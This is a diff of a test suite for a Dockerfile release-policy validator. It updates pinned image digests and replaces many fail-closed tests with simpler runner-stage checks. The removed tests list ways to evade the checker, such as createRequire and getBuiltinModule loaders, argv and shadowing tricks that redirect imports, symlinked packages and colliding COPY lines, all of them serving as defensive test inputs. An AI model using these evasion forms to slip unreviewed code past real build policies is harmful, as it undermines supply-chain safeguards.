@@ -4,7 +4,6 @@ import {
   mkdir,
   readFile,
   rm,
-  symlink,
   writeFile,
 } from 'node:fs/promises';
 import os from 'node:os';
@@ -19,7 +18,7 @@ import {
 import { runReleaseVerification } from '../verify-release.mjs';
 
 const APPROVED_IMAGE =
-  'postgres:16-alpine@sha256:57c72fd2a128e416c7fcc499958864df5301e940bca0a56f58fddf30ffc07777';
+  'postgres:16-alpine@sha256:721873c34ceb9f8d8fc265984940dc982404c105f19ad51be9fdc5970a6080ea';
 const RUNTIME_CREDENTIAL_COPY =
   'COPY --from=builder --chown=nextjs:nodejs /app/src/lib/runtime-credentials.js ./src/lib/runtime-credentials.js';
 const STANDALONE_RUNTIME_COPY = 'COPY --from=builder /app/.next/standalone ./';
@@ -76,20 +75,10 @@ async function createBaselineFixture() {
     devDependencies: {},
   };
   await writeRelative(root, 'package.json', `${JSON.stringify(packageJson, null, 2)}\n`);
-  await writeRelative(root, 'node_modules/zod/package.json', `${JSON.stringify({
-    name: 'zod',
-    version: '0.0.0',
-    type: 'module',
-    exports: {
-      '.': './index.js',
-      './a-valid': './index.js',
-    },
-  }, null, 2)}\n`);
-  await writeRelative(root, 'node_modules/zod/index.js', 'export const z = {};\n');
   await writeRelative(
     root,
     'scripts/system-orchestrator.sh',
-    '#!/usr/bin/env bash\nPROFILE="development"\n',
+    '#!/usr/bin/env bash\nset -Eeuo pipefail\n',
   );
   await writeRelative(root, 'scripts/ensure-pepper.js', 'const SECURITY_PEPPER = true;\n');
   await writeRelative(root, 'scripts/README.md', [
@@ -208,7 +197,7 @@ async function createBaselineFixture() {
       "export const APPROVED_POSTGRES_REPOSITORY = 'postgres';",
       "export const APPROVED_POSTGRES_TAG = '16-alpine';",
       "export const APPROVED_POSTGRES_INDEX_DIGEST =",
-      "  'sha256:57c72fd2a128e416c7fcc499958864df5301e940bca0a56f58fddf30ffc07777';",
+      "  'sha256:721873c34ceb9f8d8fc265984940dc982404c105f19ad51be9fdc5970a6080ea';",
       '',
     ].join('\n'),
   );
@@ -221,7 +210,7 @@ async function createBaselineFixture() {
   await writeRelative(root, 'deploy/nginx/includes/cloudflare-geo.conf', '203.0.113.0/24 1;\n');
   await writeRelative(root, 'deploy/nginx/image.lock.json', JSON.stringify({
     repository: 'docker.io/library/nginx',
-    digest: 'sha256:a8b39bd9cf0f83869a2162827a0caf6137ddf759d50a171451b335cecc87d236',
+    digest: 'sha256:0985e772fb9f729e6fa0980da05fca5d9c468e870eed43071545afa9d2e27d94',
     mediaType: 'application/vnd.oci.image.index.v1+json',
   }));
   await writeRelative(root, 'deploy/nginx/nginx.conf.template', [
@@ -464,971 +453,92 @@ test('rejects a system orchestrator that can target production', async () => {
   });
 });
 
-test('rejects an omitted repository-relative final-image dependency', async () => {
+async function mutateDockerfile(root, mutate) {
+  const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
+  await writeFile(dockerfilePath, mutate(await readFile(dockerfilePath, 'utf8')), 'utf8');
+}
+
+test('accepts runner-stage changes outside the static runner checks', async () => {
   await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(`${RUNTIME_CREDENTIAL_COPY}\n`, ''),
-      'utf8',
-    );
+    await mutateDockerfile(root, (dockerfile) => dockerfile
+      .replace(RUNTIME_ENV, `${RUNTIME_ENV}\nENV EXTRA_SETTING=1`)
+      .replace(RUNTIME_HARDENING_RUN, `${RUNTIME_HARDENING_RUN}\nRUN true`)
+      .replace('FROM node:22-alpine AS runner', 'FROM node:22-alpine AS workers\nUSER 1001:1001\nFROM node:22-alpine AS runner')
+      .concat('FROM node:22-alpine AS migrate\nADD . .\nUSER root\n'));
+    assert.deepEqual(await validateReleasePolicy(root), []);
+  });
+});
+
+test('requires a runner stage in the security image', async () => {
+  await withFixture(async (root) => {
+    await mutateDockerfile(root, (dockerfile) => dockerfile.replace(
+      'FROM node:22-alpine AS runner',
+      'FROM node:22-alpine AS web',
+    ));
     assertRejected(
       await validateReleasePolicy(root),
-      /runtime module dependency is absent from the final image: src\/lib\/runtime-credentials\.js/u,
+      /docker\/Dockerfile\.security must contain a runner stage/u,
     );
   });
 });
 
-test('rejects a symlinked manually copied runtime module', async () => {
-  await withFixture(async (root) => {
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    await rm(credentialPath);
-    await writeRelative(root, 'src/lib/runtime-credentials-real.js', credentialSource);
-    await symlink('runtime-credentials-real.js', credentialPath);
-    assertRejected(
-      await validateReleasePolicy(root),
-      /manually copied runtime module must be a regular file: src\/lib\/runtime-credentials\.js/u,
-    );
-  });
-});
-
-test('rejects unexpected transitive imports deterministically without source values', async () => {
-  await withFixture(async (root) => {
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    const privateFixtureValue = ['private', 'fixture', 'value', 'must', 'not', 'appear'].join('-');
-    await writeFile(credentialPath, [
-      credentialSource.trimEnd(),
-      `const opaqueRuntimeValue = ${JSON.stringify(privateFixtureValue)};`,
-      'void opaqueRuntimeValue;',
-      "await import('./runtime-extra-b.js');",
-      "require('./runtime-extra-a.cjs');",
-      '',
-    ].join('\n'), 'utf8');
-    await writeRelative(root, 'src/lib/runtime-extra-a.cjs', 'module.exports = true;\n');
-    await writeRelative(root, 'src/lib/runtime-extra-b.js', 'export const extraB = true;\n');
-
-    const first = await validateReleasePolicy(root);
-    const second = await validateReleasePolicy(root);
-    assert.deepEqual(first, second);
-    assert.deepEqual(first, [...first].sort());
-    assertRejected(first, /runtime-extra-a\.cjs/u);
-    assertRejected(first, /runtime-extra-b\.js/u);
-    assert.equal(first.join('\n').includes(privateFixtureValue), false);
-  });
-});
-
-test('rejects a non-literal dynamic import outside the modeled CMD target', async () => {
-  await withFixture(async (root) => {
-    const startupPath = path.join(root, 'scripts/start-standalone.mjs');
-    const startupSource = await readFile(startupPath, 'utf8');
-    await writeFile(
-      startupPath,
-      startupSource.replace(
-        'await import(pathToFileURL(resolve(serverPath)).href);',
-        'await import(process.env.RUNTIME_TARGET);',
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime module contains an unresolved dynamic import: scripts\/start-standalone\.mjs/u,
-    );
-  });
-});
-
-test('rejects dynamic import options and extra require arguments fail closed', async () => {
-  for (const addition of [
-    "await import('./runtime-extra.js', { with: { type: 'json' } });",
-    "require('./runtime-extra.cjs', 'ignored');",
-  ]) {
-    await withFixture(async (root) => {
-      const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-      const credentialSource = await readFile(credentialPath, 'utf8');
-      await writeFile(
-        credentialPath,
-        `${credentialSource.trimEnd()}\n${addition}\n`,
-        'utf8',
-      );
-      const errors = await validateReleasePolicy(root);
-      assertRejected(
-        errors,
-        /non-literal require|unresolved dynamic import/u,
-      );
-    });
-  }
-});
-
-test('rejects unmodeled CommonJS loader forms fail closed', async () => {
-  for (const addition of [
-    [
-      "import { createRequire } from 'node:module';",
-      'const loadRuntimeModule = createRequire(import.meta.url);',
-      "loadRuntimeModule('./runtime-omitted.cjs');",
-    ].join('\n'),
-    [
-      "const { createRequire } = await import('node:module');",
-      'const loadRuntimeModule = createRequire(import.meta.url);',
-      "loadRuntimeModule('./runtime-omitted.cjs');",
-    ].join('\n'),
-    [
-      "import { Module } from 'node:module';",
-      'const loadRuntimeModule = Module.createRequire(import.meta.url);',
-      "loadRuntimeModule('./runtime-omitted.cjs');",
-    ].join('\n'),
-    [
-      "const { createRequire } = process.getBuiltinModule('node:module');",
-      'const loadRuntimeModule = createRequire(import.meta.url);',
-      "loadRuntimeModule('./runtime-omitted.cjs');",
-    ].join('\n'),
-    [
-      'const { getBuiltinModule } = process;',
-      "const { createRequire } = getBuiltinModule('node:module');",
-      'const loadRuntimeModule = createRequire(import.meta.url);',
-      "loadRuntimeModule('./runtime-omitted.cjs');",
-    ].join('\n'),
-    "module.require('./runtime-omitted.cjs');",
-    "module['require']('./runtime-omitted.cjs');",
-    "require.call(null, './runtime-omitted.cjs');",
-    "require.bind(null)('./runtime-omitted.cjs');",
-    "require.resolve('./runtime-omitted.cjs');",
-  ]) {
-    await withFixture(async (root) => {
-      const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-      const credentialSource = await readFile(credentialPath, 'utf8');
-      await writeFile(
-        credentialPath,
-        `${credentialSource.trimEnd()}\n${addition}\n`,
-        'utf8',
-      );
-      assertRejected(
-        await validateReleasePolicy(root),
-        /runtime module contains an unsupported loader: src\/lib\/runtime-credentials\.js/u,
-      );
-    });
-  }
-});
-
-test('rejects unmodeled runtime-loaded data access fail closed', async () => {
-  for (const addition of [
-    [
-      "import { readFileSync } from 'node:fs';",
-      "readFileSync(new URL('./runtime-omitted.json', import.meta.url));",
-    ].join('\n'),
-    "process.loadEnvFile(new URL('./runtime-omitted.env', import.meta.url));",
-    [
-      'const { loadEnvFile } = process;',
-      "loadEnvFile(new URL('./runtime-omitted.env', import.meta.url));",
-    ].join('\n'),
-  ]) {
-    await withFixture(async (root) => {
-      const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-      const credentialSource = await readFile(credentialPath, 'utf8');
-      await writeFile(credentialPath, [
-        credentialSource.trimEnd(),
-        addition,
-        '',
-      ].join('\n'), 'utf8');
-      assertRejected(
-        await validateReleasePolicy(root),
-        /runtime module contains unmodeled runtime data access: src\/lib\/runtime-credentials\.js/u,
-      );
-    });
-  }
-});
-
-test('rejects mutable or shadowed CMD-derived loader bindings', async () => {
+test('requires the runner stage to run as the non-root runtime user', async () => {
   for (const mutate of [
-    (source) => source.replace(
-      'const serverPath = process.argv[2];',
-      'let serverPath = process.argv[2];\nserverPath = process.env.RUNTIME_TARGET;',
-    ),
-    (source) => source.replace(
-      'await import(pathToFileURL(resolve(serverPath)).href);',
-      [
-        '{',
-        '  const resolve = () => process.env.RUNTIME_TARGET;',
-        '  await import(pathToFileURL(resolve(serverPath)).href);',
-        '}',
-      ].join('\n'),
-    ),
-    (source) => source.replace(
-      'const serverPath = process.argv[2];',
-      [
-        "const process = { argv: ['node', 'wrapper', 'other.js'] };",
-        'const serverPath = process.argv[2];',
-      ].join('\n'),
-    ),
-    (source) => source.replace(
-      'const serverPath = process.argv[2];',
-      [
-        'process.argv[2] = process.env.RUNTIME_TARGET;',
-        'const serverPath = process.argv[2];',
-      ].join('\n'),
-    ),
-    (source) => source.replace(
-      'const serverPath = process.argv[2];',
-      [
-        "process.argv.splice(2, 1, 'other.js');",
-        'const serverPath = process.argv[2];',
-      ].join('\n'),
-    ),
-    (source) => source.replace(
-      'const serverPath = process.argv[2];',
-      [
-        'const processAlias = globalThis.process;',
-        "processAlias.argv[2] = 'other.js';",
-        'const serverPath = process.argv[2];',
-      ].join('\n'),
-    ),
-    (source) => source.replace(
-      'const serverPath = process.argv[2];',
-      [
-        'const processAlias = process;',
-        "processAlias.argv[2] = 'other.js';",
-        'const serverPath = process.argv[2];',
-      ].join('\n'),
-    ),
-    (source) => source.replace(
-      "import { z } from 'zod';",
-      [
-        "import { z } from 'zod';",
-        "import processAlias from 'node:process';",
-        "processAlias.argv[2] = 'other.js';",
-      ].join('\n'),
-    ),
+    (dockerfile) => dockerfile.replace(RUNTIME_USER, 'USER root'),
+    (dockerfile) => dockerfile.replace(`${RUNTIME_USER}\n`, ''),
+    (dockerfile) => dockerfile.replace(RUNTIME_USER, `${RUNTIME_USER}\nUSER root`),
   ]) {
     await withFixture(async (root) => {
-      const startupPath = path.join(root, 'scripts/start-standalone.mjs');
-      const startupSource = await readFile(startupPath, 'utf8');
-      await writeFile(startupPath, mutate(startupSource), 'utf8');
+      await mutateDockerfile(root, mutate);
       assertRejected(
         await validateReleasePolicy(root),
-        /runtime module contains (?:an unresolved dynamic import|an unsupported loader): scripts\/start-standalone\.mjs/u,
+        /docker\/Dockerfile\.security: runner stage must run as USER 1001:1001/u,
       );
     });
   }
 });
 
-test('rejects removal of the explicitly copied CMD runtime module', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(`${STARTUP_RUNTIME_COPY}\n`, ''),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /final Node runtime module must be explicitly copied: scripts\/start-standalone\.mjs/u,
-    );
-  });
-});
-
-test('rejects final WORKDIR drift from the packaged CMD runtime module', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        'CMD ["node", "scripts/start-standalone.mjs", "server.js"]',
-        'WORKDIR /other\nCMD ["node", "scripts/start-standalone.mjs", "server.js"]',
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /final Node runtime module must be explicitly copied/u,
-    );
-  });
-});
-
-test('rejects removal of the standalone tree that supplies the CMD target', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(`${STANDALONE_RUNTIME_COPY}\n`, ''),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime module contains an unresolved dynamic import: scripts\/start-standalone\.mjs/u,
-    );
-  });
-});
-
-test('rejects a CMD target that is not the standalone root entrypoint', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        'CMD ["node", "scripts/start-standalone.mjs", "server.js"]',
-        'CMD ["node", "scripts/start-standalone.mjs", "nested/server.js"]',
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime module contains an unresolved dynamic import: scripts\/start-standalone\.mjs/u,
-    );
-  });
-});
-
-test('rejects a missing authoritative builder-stage alias', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace('FROM node:22-alpine AS builder', 'FROM node:22-alpine'),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /one distinct prior builder stage/u,
-    );
-  });
-});
-
-test('accepts Node built-ins without final-image copies', async () => {
-  await withFixture(async (root) => {
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    await writeFile(
-      credentialPath,
-      `${credentialSource.trimEnd()}\nimport test from 'node:test';\nvoid test;\n`,
-      'utf8',
-    );
-    assert.deepEqual(await validateReleasePolicy(root), []);
-  });
-});
-
-test('rejects a package import absent from the final runtime dependency tree', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(`${ZOD_RUNTIME_COPY}\n`, ''),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package is absent from the final-image dependency tree: zod/u,
-    );
-  });
-});
-
-test('resolves every imported package subpath before accepting its package root', async () => {
-  await withFixture(async (root) => {
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    await writeFile(credentialPath, [
-      credentialSource.trimEnd(),
-      "import 'zod/a-valid';",
-      "import 'zod/z-missing';",
-      '',
-    ].join('\n'), 'utf8');
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package must resolve from the installed dependency tree: zod/u,
-    );
-  });
-});
-
-test('recursively requires hoisted runtime package dependencies in the final image', async () => {
-  await withFixture(async (root) => {
-    const packagePath = path.join(root, 'package.json');
-    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
-    packageJson.dependencies.alpha = '0.0.0';
-    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
-    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
-      name: 'alpha',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-      dependencies: { beta: '0.0.0' },
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
-    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
-      name: 'beta',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/beta/index.js', 'export const beta = true;\n');
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    await writeFile(
-      credentialPath,
-      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
-      'utf8',
-    );
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    const alphaCopy =
-      'COPY --from=builder /app/node_modules/alpha ./node_modules/alpha';
-    const betaCopy =
-      'COPY --from=builder /app/node_modules/beta ./node_modules/beta';
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(ZOD_RUNTIME_COPY, `${ZOD_RUNTIME_COPY}\n${alphaCopy}`),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package dependency is absent from the final-image dependency tree: alpha -> beta/u,
-    );
-
-    await writeFile(
-      dockerfilePath,
-      (await readFile(dockerfilePath, 'utf8')).replace(alphaCopy, `${alphaCopy}\n${betaCopy}`),
-      'utf8',
-    );
-    assert.deepEqual(await validateReleasePolicy(root), []);
-
-    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
-      name: 'beta',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-      dependencies: { gamma: '0.0.0' },
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/gamma/package.json', `${JSON.stringify({
-      name: 'gamma',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/gamma/index.js', 'export const gamma = true;\n');
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package dependency is absent from the final-image dependency tree: beta -> gamma/u,
-    );
-  });
-});
-
-test('requires an installed optional runtime dependency in the final image', async () => {
-  await withFixture(async (root) => {
-    const packagePath = path.join(root, 'package.json');
-    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
-    packageJson.dependencies.alpha = '0.0.0';
-    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
-    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
-      name: 'alpha',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-      optionalDependencies: { beta: '0.0.0' },
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
-    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
-      name: 'beta',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/beta/index.js', 'export const beta = true;\n');
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    await writeFile(
-      credentialPath,
-      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
-      'utf8',
-    );
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        ZOD_RUNTIME_COPY,
-        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/alpha ./node_modules/alpha`,
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package dependency is absent from the final-image dependency tree: alpha -> beta/u,
-    );
-  });
-});
-
-test('rejects a symlinked package dependency slot outside its parent COPY', async () => {
-  await withFixture(async (root) => {
-    const packagePath = path.join(root, 'package.json');
-    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
-    packageJson.dependencies.alpha = '0.0.0';
-    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
-    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
-      name: 'alpha',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-      optionalDependencies: { beta: '0.0.0' },
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
-    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
-      name: 'beta',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/beta/index.js', 'export const beta = true;\n');
-    await mkdir(path.join(root, 'node_modules/alpha/node_modules'), { recursive: true });
-    await symlink(
-      '../../beta',
-      path.join(root, 'node_modules/alpha/node_modules/beta'),
-    );
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    await writeFile(
-      credentialPath,
-      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
-      'utf8',
-    );
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        ZOD_RUNTIME_COPY,
-        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/alpha ./node_modules/alpha`,
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package metadata is invalid: alpha/u,
-    );
-  });
-});
-
-test('rejects a symlinked directly imported package root', async () => {
-  await withFixture(async (root) => {
-    await rm(path.join(root, 'node_modules/zod'), { force: true, recursive: true });
-    await writeRelative(root, 'node_modules/zod-real/package.json', `${JSON.stringify({
-      name: 'zod',
-      version: '0.0.0',
-      type: 'module',
-      exports: {
-        '.': './index.js',
-        './a-valid': './index.js',
-      },
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/zod-real/index.js', 'export const z = {};\n');
-    await symlink('zod-real', path.join(root, 'node_modules/zod'));
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package metadata is invalid: zod/u,
-    );
-  });
-});
-
-test('accepts a nested runtime dependency covered by its parent package copy', async () => {
-  await withFixture(async (root) => {
-    const packagePath = path.join(root, 'package.json');
-    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
-    packageJson.dependencies.alpha = '0.0.0';
-    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
-    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
-      name: 'alpha',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-      dependencies: { beta: '0.0.0' },
-    }, null, 2)}\n`);
-    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
-    await writeRelative(root, 'node_modules/alpha/node_modules/beta/package.json',
-      `${JSON.stringify({
-        name: 'beta',
-        version: '0.0.0',
-        type: 'module',
-        exports: './index.js',
-      }, null, 2)}\n`);
-    await writeRelative(
-      root,
-      'node_modules/alpha/node_modules/beta/index.js',
-      'export const beta = true;\n',
-    );
-    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
-    const credentialSource = await readFile(credentialPath, 'utf8');
-    await writeFile(
-      credentialPath,
-      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
-      'utf8',
-    );
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        ZOD_RUNTIME_COPY,
-        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/alpha ./node_modules/alpha`,
-      ),
-      'utf8',
-    );
-    assert.deepEqual(await validateReleasePolicy(root), []);
-  });
-});
-
-test('rejects a package copied to another package final-image location', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(ZOD_RUNTIME_COPY, [
-        ZOD_RUNTIME_COPY,
-        'COPY --from=builder /app/node_modules/zod ./node_modules/not-zod',
-      ].join('\n')),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package must preserve its final-image location: zod/u,
-    );
-  });
-});
-
-test('rejects a foreign copy that can collide with a runtime package tree', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(ZOD_RUNTIME_COPY, [
-        ZOD_RUNTIME_COPY,
-        'COPY --from=other /foreign/module ./node_modules/zod/foreign',
-      ].join('\n')),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime package final-image tree has a foreign COPY collision: zod/u,
-    );
-  });
-});
-
-test('rejects a foreign copy that can overwrite a packaged runtime module', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(RUNTIME_CREDENTIAL_COPY, [
-        RUNTIME_CREDENTIAL_COPY,
-        'COPY --from=other /foreign/module ./src/lib/runtime-credentials.js',
-      ].join('\n')),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /runtime module final-image path has a foreign COPY collision: src\/lib\/runtime-credentials\.js/u,
-    );
-  });
-});
-
-test('rejects a foreign copy that can overwrite the standalone runtime target', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        STANDALONE_RUNTIME_COPY,
-        `${STANDALONE_RUNTIME_COPY}\nCOPY --from=other /foreign/server.js ./server.js`,
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /standalone runtime target has a foreign COPY collision/u,
-    );
-  });
-});
-
-test('rejects an unmodeled copy into the repository source tree', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        RUNTIME_CREDENTIAL_COPY,
-        `${RUNTIME_CREDENTIAL_COPY}\nCOPY --from=other /foreign/unrelated.js ./src/lib/unrelated.js`,
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /docker\/Dockerfile\.security: unmodeled repository-source destination COPY/u,
-    );
-  });
-});
-
-test('rejects broad repository-source copies as runtime-closure substitutes', async () => {
-  for (const [options, source, destination] of [
-    ['--from=builder ', '/app', './'],
-    ['--from=builder ', '/app/src', './src'],
-    ['--from=builder ', '/app/src/lib', './src/lib'],
-    ['--from=other ', '/app/src', './src'],
-    ['', '.', './'],
-    ['', 'src', './src'],
-    ['', 'src/lib', './src/lib'],
+test('requires the runner stage to remove npm and npx', async () => {
+  for (const replacement of [
+    'RUN apk add --no-cache dumb-init=1.2.5-r4',
+    RUNTIME_SETUP_RUN.replace(' /usr/local/bin/npx', ''),
+    RUNTIME_SETUP_RUN.replace('rm -f', 'ls'),
   ]) {
     await withFixture(async (root) => {
-      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-      const dockerfile = await readFile(dockerfilePath, 'utf8');
-      await writeFile(
-        dockerfilePath,
-        dockerfile.replace(
-          RUNTIME_CREDENTIAL_COPY,
-          `COPY ${options}${source} ${destination}`,
-        ),
-        'utf8',
-      );
+      await mutateDockerfile(root, (dockerfile) => dockerfile.replace(RUNTIME_SETUP_RUN, replacement));
       assertRejected(
         await validateReleasePolicy(root),
-        /broad repository-source COPY is forbidden/u,
+        /docker\/Dockerfile\.security: runner stage must remove npm and npx/u,
       );
     });
   }
+  await withFixture(async (root) => {
+    await mutateDockerfile(root, (dockerfile) => dockerfile
+      .replace(RUNTIME_SETUP_RUN, 'RUN apk add --no-cache dumb-init=1.2.5-r4')
+      .replace('FROM node:22-alpine AS runner', `FROM node:22-alpine AS workers\n${RUNTIME_SETUP_RUN}\nFROM node:22-alpine AS runner`));
+    assertRejected(
+      await validateReleasePolicy(root),
+      /docker\/Dockerfile\.security: runner stage must remove npm and npx/u,
+    );
+  });
 });
 
-test('rejects final-stage ADD instructions as unmodeled runtime inputs', async () => {
+test('rejects runner-stage ADD instructions', async () => {
   for (const instruction of [
     'ADD . .',
     'ADD src ./src',
   ]) {
     await withFixture(async (root) => {
-      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-      const dockerfile = await readFile(dockerfilePath, 'utf8');
-      await writeFile(
-        dockerfilePath,
-        dockerfile.replace(
-          RUNTIME_CREDENTIAL_COPY,
-          `${RUNTIME_CREDENTIAL_COPY}\n${instruction}`,
-        ),
-        'utf8',
-      );
-      assertRejected(
-        await validateReleasePolicy(root),
